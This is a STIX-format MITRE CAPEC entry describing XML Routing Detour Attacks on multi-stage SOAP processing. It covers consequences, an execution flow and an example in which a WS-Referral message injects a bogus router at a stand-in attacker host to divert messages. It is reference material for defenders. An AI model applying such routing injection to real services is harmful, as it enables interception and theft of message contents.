{
    "id": "bundle--4a4098d7-fb21-4873-9c99-67ac2a93288c",
    "objects": [
        {
            "created": "2014-06-23T00:00:00.000Z",
            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
            "description": "An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Adversary in the Middle type attacks (CAPEC-94). The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of their choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.",
            "external_references": [
                {
                    "external_id": "CAPEC-219",
                    "source_name": "capec",
                    "url": "https://capec.mitre.org/data/definitions/219.html"
                },
                {
                    "external_id": "CWE-441",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/441.html"
                },
                {
                    "external_id": "CWE-610",
                    "source_name": "cwe",
                    "url": "http://cwe.mitre.org/data/definitions/610.html"
                },
                {
                    "description": "Routing Detour",
                    "external_id": "32",
                    "source_name": "WASC",
                    "url": "http://projects.webappsec.org/Routing-Detour"
                },
                {
                    "description": "XML Entity Expansion",
                    "external_id": "44",
                    "source_name": "WASC",
                    "url": "http://projects.webappsec.org/XML-Entity-Expansion"
                },
                {
                    "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
                    "external_id": "REF-80",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://projects.webappsec.org/w/page/13246956/Routing-Detour"
                },
                {
                    "description": "Andre Yee, Threat Protection in a Service Oriented World, NFR Security",
                    "external_id": "REF-81",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf"
                },
                {
                    "description": "Pete Lindstrom, Attacking & Defending Web Services, 2002, SPiRE Security",
                    "external_id": "REF-65",
                    "source_name": "reference_from_CAPEC",
                    "url": "http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf"
                }
            ],
            "id": "attack-pattern--9b939586-fbef-4343-94f0-0046124e3e7f",
            "modified": "2021-06-24T00:00:00.000Z",
            "name": "XML Routing Detour Attacks",
            "object_marking_refs": [
                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
            ],
            "type": "attack-pattern",
            "x_capec_abstraction": "Standard",
            "x_capec_child_of_refs": [
                "attack-pattern--38964770-4f39-4191-89cf-73a625162b2b"
            ],
            "x_capec_consequences": {
                "Access_Control": [
                    "Bypass Protection Mechanism"
                ],
                "Accountability": [
                    "Gain Privileges"
                ],
                "Authentication": [
                    "Gain Privileges"
                ],
                "Authorization": [
                    "Gain Privileges",
                    "Bypass Protection Mechanism"
                ],
                "Confidentiality": [
                    "Read Data"
                ],
                "Integrity": [
                    "Modify Data"
                ],
                "Non-Repudiation": [
                    "Gain Privileges"
                ]
            },
            "x_capec_example_instances": [
                "\n               <xhtml:p>Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction).</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"informative\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Example SOAP message with routing information in header:</xhtml:div>\n                  <xhtml:div style=\"margin-left:10px;\"><S:Envelope><xhtml:div style=\"margin-left:10px;\"><S:Header><xhtml:div style=\"margin-left:10px;\"><m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\"><xhtml:div style=\"margin-left:10px;\"><m:action>http://example1.com/</m:action></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:to>http://example4.com/router</m:to></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:fwd> <m:via>http://example2.com/router</m:via> </m:fwd></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:rev /></xhtml:div></m:path></xhtml:div></S:Header></xhtml:div>\n                     <xhtml:div style=\"margin-left:10px;\"><S:Body><xhtml:div style=\"margin-left:10px;\">...</xhtml:div></S:Body></xhtml:div></S:Envelope></xhtml:div>\n                  \n                  <xhtml:p>Add an additional node (example3.com/router) to the XML path in a WS-Referral message</xhtml:p>\n                  <xhtml:div style=\"margin-left:10px;\"><r:ref xmlns:r=\"http://schemas.example.com/referral\"><xhtml:div style=\"margin-left:10px;\"><r:for><xhtml:div style=\"margin-left:10px;\"><r:prefix>http://example2.com/router</r:prefix></xhtml:div></r:for></xhtml:div>\n                     <xhtml:div style=\"margin-left:10px;\"><r:if/></xhtml:div>\n                     <xhtml:div style=\"margin-left:10px;\"><r:go><xhtml:div style=\"margin-left:10px;\"><r:via>http://example3.com/router</r:via></xhtml:div></r:go></xhtml:div></r:ref></xhtml:div>\n               </xhtml:div>\n               <xhtml:div style=\"margin-left:10px;\" class=\"result\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Resulting in the following SOAP Header:</xhtml:div>\n                  <xhtml:div style=\"margin-left:10px;\"><S:Envelope><xhtml:div style=\"margin-left:10px;\"><S:Header><xhtml:div style=\"margin-left:10px;\"><m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\"><xhtml:div style=\"margin-left:10px;\"><m:action>http://example1.com/</m:action></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:to>http://example4.com/router</m:to></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:fwd><xhtml:div style=\"margin-left:10px;\"><m:via>http://example2.com/router</m:via></xhtml:div>\n                              <xhtml:div style=\"margin-left:10px;\"><m:via>http://example3.com/router</m:via></xhtml:div></m:fwd></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:rev /></xhtml:div></m:path></xhtml:div></S:Header></xhtml:div>\n                     <xhtml:div style=\"margin-left:10px;\"><S:Body><xhtml:div style=\"margin-left:10px;\">...</xhtml:div></S:Body></xhtml:div></S:Envelope></xhtml:div>\n               </xhtml:div>\n               <xhtml:p>Continuing with this example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that they have targeted.</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"attack\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Example of WS-Referral based WS-Routing injection of the bogus node route:</xhtml:div>\n                  <xhtml:div style=\"margin-left:10px;\"><r:ref xmlns:r=\"http://schemas.example.com/referral\"><xhtml:div style=\"margin-left:10px;\"><r:for><xhtml:div style=\"margin-left:10px;\"><r:prefix>http://example2.com/router</r:prefix></xhtml:div></r:for></xhtml:div>\n                     <xhtml:div style=\"margin-left:10px;\"><r:if/></xhtml:div>\n                     <xhtml:div style=\"margin-left:10px;\"><r:go><xhtml:div style=\"margin-left:10px;\"><r:via>http://evilsite1.com/router</r:via></xhtml:div></r:go></xhtml:div></r:ref></xhtml:div>\n               </xhtml:div>\n               <xhtml:div style=\"margin-left:10px;\" class=\"result\">\n                  <xhtml:div style=\"color:#32498D; font-weight:bold;\">Resulting XML Routing Detour attack:</xhtml:div>\n                  <xhtml:div style=\"margin-left:10px;\"><S:Envelope><xhtml:div style=\"margin-left:10px;\"><S:Header><xhtml:div style=\"margin-left:10px;\"><m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\"><xhtml:div style=\"margin-left:10px;\"><m:action>http://example_0.com/</m:action></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:to>http://example_4.com/router</m:to></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:fwd><xhtml:div style=\"margin-left:10px;\"><m:via>http://example2.com/router</m:via></xhtml:div>\n                              <xhtml:div style=\"margin-left:10px;\"><m:via>http://evilesite1.com/router</m:via></xhtml:div>\n                              <xhtml:div style=\"margin-left:10px;\"><m:via>http://example3.com/router</m:via></xhtml:div></m:fwd></xhtml:div>\n                           <xhtml:div style=\"margin-left:10px;\"><m:rev /></xhtml:div></m:path></xhtml:div></S:Header></xhtml:div>\n                     <xhtml:div style=\"margin-left:10px;\"><S:Body><xhtml:div style=\"margin-left:10px;\">...</xhtml:div></S:Body></xhtml:div></S:Envelope></xhtml:div>\n               </xhtml:div>\n               <xhtml:p>Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents).</xhtml:p>\n            "
            ],
            "x_capec_execution_flow": "<h2> Execution Flow </h2><div><h3>Explore</h3><ol><li> <p> <b>Survey the target: </b>Using command line or an automated tool, an attacker records all instances of web services to process XML requests.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Use automated tool to record all instances to process XML requests or find exposed WSDL.</td></tr><tr><td>Use tools to crawl WSDL</td></tr></tbody></table></ol></div><div><h3>Experiment</h3><ol><li> <p> <b>Identify SOAP messages that have multiple state processing.: </b>Inspect instance to see whether the XML processing has multiple stages or not.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Launch an XML routing detour attack: </b>The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message</td></tr></tbody></table></ol></div>",
            "x_capec_likelihood_of_attack": "High",
            "x_capec_prerequisites": [
                "The targeted system must have multiple stages processing of XML content."
            ],
            "x_capec_resources_required": [
                "The attacker must be able to insert or compromise a system into the processing path for the transaction."
            ],
            "x_capec_skills_required": {
                "Low": "To inject a bogus node in the XML routing table"
            },
            "x_capec_status": "Draft",
            "x_capec_typical_severity": "Medium",
            "x_capec_version": "3.6"
        }
    ],
    "spec_version": "2.0",
    "type": "bundle"
}